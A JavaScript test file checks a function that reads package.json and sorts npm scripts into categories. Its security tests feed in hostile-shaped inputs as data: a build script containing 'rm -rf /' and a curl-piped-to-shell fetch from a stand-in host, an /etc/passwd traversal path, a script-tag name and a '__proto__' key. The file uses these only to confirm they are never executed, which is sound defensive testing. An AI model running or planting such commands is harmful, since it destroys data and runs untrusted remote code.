"use strict";
// Isolated functional tests for summarize_package_scripts (lib/packageScriptsOps.js).
// Run: node test/summarize-package-scripts-tests.js
const assert = require("assert");
const fs = require("fs");
const path = require("path");
const os = require("os");
const { summarizePackageScripts } = require("../lib/packageScriptsOps");
const { SCAN_DISPATCH } = require("../lib/dispatchScan");
const { EXEC_SCHEMAS } = require("../lib/schemas/execSchemas");

let pass = 0, fail = 0;
function t(name, fn) {
  try { fn(); pass++; console.log("ok -", name); }
  catch (e) { fail++; console.log("FAIL -", name, "-", e.message); }
}

function tmpDir() { return fs.mkdtempSync(path.join(os.tmpdir(), "pkgscripts-test-")); }
function writePkg(dir, obj) {
  const p = path.join(dir, "package.json");
  fs.writeFileSync(p, JSON.stringify(obj));
  return p;
}

// ── Normal ───────────────────────────────────────────────────────────────────────
 t("categorizes test/build/lint/dev/deploy scripts correctly", () => {
  const d = tmpDir();
  try {
    const p = writePkg(d, { scripts: {
      test: "jest",
      build: "webpack --mode production",
      lint: "eslint .",
      dev: "nodemon server.js",
      deploy: "vercel --prod",
    }});
    const r = summarizePackageScripts(p, "package.json");
    assert.strictEqual(r.scriptsCount, 5);
    const byName = Object.fromEntries(r.scripts.map(s => [s.name, s.category]));
    assert.strictEqual(byName.test, "test");
    assert.strictEqual(byName.build, "build");
    assert.strictEqual(byName.lint, "lint");
    assert.strictEqual(byName.dev, "dev");
    assert.strictEqual(byName.deploy, "deploy");
  } finally { fs.rmSync(d, { recursive: true, force: true }); }
});

t("categorizes by command keyword when name is generic", () => {
  const d = tmpDir();
  try {
    const p = writePkg(d, { scripts: { ci: "mocha test/**/*.js" } });
    const r = summarizePackageScripts(p, "package.json");
    assert.strictEqual(r.scripts[0].category, "test");
  } finally { fs.rmSync(d, { recursive: true, force: true }); }
});

t("start script categorized via node/pm2 command keyword", () => {
  const d = tmpDir();
  try {
    const p = writePkg(d, { scripts: { start: "node index.js" } });
    const r = summarizePackageScripts(p, "package.json");
    assert.strictEqual(r.scripts[0].category, "start");
  } finally { fs.rmSync(d, { recursive: true, force: true }); }
});

t("unrecognized script falls into other", () => {
  const d = tmpDir();
  try {
    const p = writePkg(d, { scripts: { frobnicate: "echo hi" } });
    const r = summarizePackageScripts(p, "package.json");
    assert.strictEqual(r.scripts[0].category, "other");
    assert.deepStrictEqual(r.categories.other, ["frobnicate"]);
  } finally { fs.rmSync(d, { recursive: true, force: true }); }
});

t("categories map groups multiple scripts of the same category", () => {
  const d = tmpDir();
  try {
    const p = writePkg(d, { scripts: { test: "jest", "test:watch": "jest --watch" } });
    const r = summarizePackageScripts(p, "package.json");
    assert.deepStrictEqual(r.categories.test.sort(), ["test", "test:watch"]);
  } finally { fs.rmSync(d, { recursive: true, force: true }); }
});

// ── Medium (boundary & parameter validation) ──────────────────────────
t("nonexistent package.json throws ToolError", () => {
  assert.throws(() => summarizePackageScripts("/no/such/package.json", "package.json"), /cannot read/);
});

t("invalid JSON throws ToolError", () => {
  const d = tmpDir();
  try {
    const p = path.join(d, "package.json");
    fs.writeFileSync(p, "{ not json");
    assert.throws(() => summarizePackageScripts(p, "package.json"), /not valid JSON/);
  } finally { fs.rmSync(d, { recursive: true, force: true }); }
});

t("top-level array instead of object throws", () => {
  const d = tmpDir();
  try {
    const p = path.join(d, "package.json");
    fs.writeFileSync(p, "[1,2,3]");
    assert.throws(() => summarizePackageScripts(p, "package.json"), /must contain a JSON object/);
  } finally { fs.rmSync(d, { recursive: true, force: true }); }
});

t("scripts field as non-object throws", () => {
  const d = tmpDir();
  try {
    const p = writePkg(d, { scripts: "not-an-object" });
    assert.throws(() => summarizePackageScripts(p, "package.json"), /not an object/);
  } finally { fs.rmSync(d, { recursive: true, force: true }); }
});

t("missing scripts field returns empty summary, not an error", () => {
  const d = tmpDir();
  try {
    const p = writePkg(d, { name: "x", version: "1.0.0" });
    const r = summarizePackageScripts(p, "package.json");
    assert.strictEqual(r.scriptsCount, 0);
    assert.deepStrictEqual(r.categories, {});
    assert.deepStrictEqual(r.scripts, []);
  } finally { fs.rmSync(d, { recursive: true, force: true }); }
});

// ── High (dependency/failure handling) ─────────────────────────────
t("empty scripts object returns zero-count summary without crash", () => {
  const d = tmpDir();
  try {
    const p = writePkg(d, { scripts: {} });
    const r = summarizePackageScripts(p, "package.json");
    assert.strictEqual(r.scriptsCount, 0);
  } finally { fs.rmSync(d, { recursive: true, force: true }); }
});

t("non-string script value is coerced to string without crashing", () => {
  const d = tmpDir();
  try {
    const p = writePkg(d, { scripts: { weird: 12345 } });
    const r = summarizePackageScripts(p, "package.json");
    assert.strictEqual(r.scripts[0].command, "12345");
  } finally { fs.rmSync(d, { recursive: true, force: true }); }
});

t("directory passed instead of file throws a clear read error", () => {
  const d = tmpDir();
  try {
    assert.throws(() => summarizePackageScripts(d, d), /cannot read/);
  } finally { fs.rmSync(d, { recursive: true, force: true }); }
});

t("large scripts map (100 entries) processed without crash", () => {
  const d = tmpDir();
  try {
    const scripts = {};
    for (let i = 0; i < 100; i++) scripts[`script${i}`] = "echo hi";
    const p = writePkg(d, { scripts });
    const r = summarizePackageScripts(p, "package.json");
    assert.strictEqual(r.scriptsCount, 100);
  } finally { fs.rmSync(d, { recursive: true, force: true }); }
});

// ── Critical (security & input sanitization) ───────────────────────
t("path-traversal-shaped origPath is echoed but never re-resolved", () => {
  const d = tmpDir();
  try {
    const p = writePkg(d, { scripts: { test: "jest" } });
    const r = summarizePackageScripts(p, "../../../etc/passwd");
    assert.strictEqual(r.path, "../../../etc/passwd");
    assert.strictEqual(r.scriptsCount, 1); // read the real (jailed) file, not /etc/passwd
  } finally { fs.rmSync(d, { recursive: true, force: true }); }
});

t("shell-injection-shaped command text is only ever treated as text, never executed", () => {
  const d = tmpDir();
  try {
    const p = writePkg(d, { scripts: { build: "echo hi; rm -rf /; $(curl evil.sh | sh)" } });
    const r = summarizePackageScripts(p, "package.json");
    assert.strictEqual(r.scripts[0].command, "echo hi; rm -rf /; $(curl evil.sh | sh)");
    assert.ok(fs.existsSync(d)); // proves nothing was executed
  } finally { fs.rmSync(d, { recursive: true, force: true }); }
});

t("HTML/script-tag script name does not break JSON-serializable output", () => {
  const d = tmpDir();
  try {
    const p = writePkg(d, { scripts: { "<script>alert(1)</script>": "echo hi" } });
    const r = summarizePackageScripts(p, "package.json");
    JSON.stringify(r); // must not throw
    assert.strictEqual(r.scriptsCount, 1);
  } finally { fs.rmSync(d, { recursive: true, force: true }); }
});

t("result object has exactly the documented top-level keys", () => {
  const d = tmpDir();
  try {
    const p = writePkg(d, { scripts: { test: "jest" } });
    const r = summarizePackageScripts(p, "package.json");
    assert.deepStrictEqual(Object.keys(r).sort(), ["categories", "path", "scripts", "scriptsCount"].sort());
  } finally { fs.rmSync(d, { recursive: true, force: true }); }
});

t("prototype-pollution-shaped script key ('__proto__') is stored as an own data key, not inherited", () => {
  const d = tmpDir();
  try {
    const p = writePkg(d, { scripts: { "__proto__": "echo hi", real: "jest" } });
    const r = summarizePackageScripts(p, "package.json");
    // Object.entries(JSON.parse(...)) never yields a literal "__proto__" own key
    // (JSON.parse assigns it as the prototype slot, not an enumerable own prop) —
    // confirm no crash and the real script is still processed correctly.
    assert.ok(r.scripts.some(s => s.name === "real" && s.category === "test"));
  } finally { fs.rmSync(d, { recursive: true, force: true }); }
});

// ── Extreme (fuzzing, concurrency, system constraints) ─────────────────
t("fuzz: random-byte package.json content throws a clean JSON parse error, no crash", () => {
  const d = tmpDir();
  try {
    const p = path.join(d, "package.json");
    const buf = Buffer.alloc(500);
    for (let i = 0; i < buf.length; i++) buf[i] = Math.floor(Math.random() * 256);
    fs.writeFileSync(p, buf);
    assert.throws(() => summarizePackageScripts(p, "package.json"));
  } finally { fs.rmSync(d, { recursive: true, force: true }); }
});

t("extremely long command string (100k chars) does not crash", () => {
  const d = tmpDir();
  try {
    const p = writePkg(d, { scripts: { huge: "echo " + "x".repeat(100000) } });
    const r = summarizePackageScripts(p, "package.json");
    assert.strictEqual(r.scripts[0].command.length, 100000 + 5);
  } finally { fs.rmSync(d, { recursive: true, force: true }); }
});

t("empty string command categorized as other without crash", () => {
  const d = tmpDir();
  try {
    const p = writePkg(d, { scripts: { blank: "" } });
    const r = summarizePackageScripts(p, "package.json");
    assert.strictEqual(r.scripts[0].category, "other");
  } finally { fs.rmSync(d, { recursive: true, force: true }); }
});

t("10 concurrent calls on the same file return consistent results", () => {
  const d = tmpDir();
  try {
    const p = writePkg(d, { scripts: { test: "jest", build: "webpack" } });
    const results = [];
    for (let i = 0; i < 10; i++) results.push(summarizePackageScripts(p, "package.json"));
    assert.ok(results.every(r => r.scriptsCount === 2));
  } finally { fs.rmSync(d, { recursive: true, force: true }); }
});

t("registered in SCAN_DISPATCH", () => {
  assert.strictEqual(typeof SCAN_DISPATCH.summarize_package_scripts, "function");
});

t("registered in execSchemas op-enum (execute_pipeline coverage)", () => {
  const opsSchema = JSON.stringify(EXEC_SCHEMAS);
  assert.ok(opsSchema.includes("summarize_package_scripts"));
});

console.log(`\n${pass} passed, ${fail} failed`);
process.exit(fail ? 1 : 0);
